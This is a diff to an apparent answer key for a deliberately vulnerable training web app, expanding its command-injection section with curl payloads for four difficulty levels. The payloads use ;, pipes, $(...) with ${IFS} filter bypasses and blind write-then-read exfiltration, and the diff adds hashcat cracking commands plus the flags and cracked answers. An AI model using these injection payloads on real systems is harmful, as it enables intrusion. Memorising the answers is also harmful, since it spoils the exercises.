@@ -72,9 +72,22 @@ md5 `?id=c4ca4238a0b923820dcc509a6f75849b` (hard) · **expert** the `?id` is ign
 by hand in DevTools → Application → Cookies) and reload → admin.
 
 ## 5. Command injection  (`tools.php?host=`)
-**Answer:** `host` is concatenated into a shell `ping`.
-**Command:** `curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1;id"`  (also `|id`, `$(id)`, `&&id`)
-**Result:** `uid=... ` appears below the ping output. **Reason:** `shell_exec("ping -c 1 ".$host)` — no escaping.
+**Answer:** `host` is concatenated into a shell `ping`. The filter escalates the operator you need, and the
+flag you read is encoded one step harder each level (plaintext → base64 → unsalted SHA-256 → salted md5):
+```
+# easy — raw, chain with ; :
+curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1; cat private/cmdi_flag.txt"      # FLAG{c0mmand_1njection_rce_on_host}
+# medium — ; & stripped -> pipe | ; flag is base64:
+curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1 | cat private/cmdi_flag.b64" | base64 -d   # FLAG{cmdi_m3dium_base64_decoded}
+# hard — ; & | ` + space stripped -> $(...) with ${IFS}; SHA-256 leaks in the ping error:
+curl -sG "$U/tools.php" --data-urlencode 'host=127.0.0.1$(cat${IFS}private/cmdi_flag.sha256)'
+hashid '<64-hex>'; hashcat -m 1400 h.txt rockyou.txt                                      # -> butterfly
+# expert — BLIND: exfiltrate to a readable file, then read it; salted md5 (hash:salt):
+curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1; cat private/cmdi_flag.salted > uploads/pwn.txt"
+curl -s "$U/uploads/pwn.txt"; hashcat -m 10 h.txt rockyou.txt                              # -> welcome
+```
+**Reason:** `shell_exec("ping -c 1 ".$host)` — no escaping; `$(...)` output leaks in ping's "name or service
+not known" error, and the blind level forces write-then-read exfiltration.
 
 ## 6. LFI / path traversal  (`index.php?page=`)
 **Answer:** `page` is included with no sanitisation, so `../` escapes the `pages/` directory.
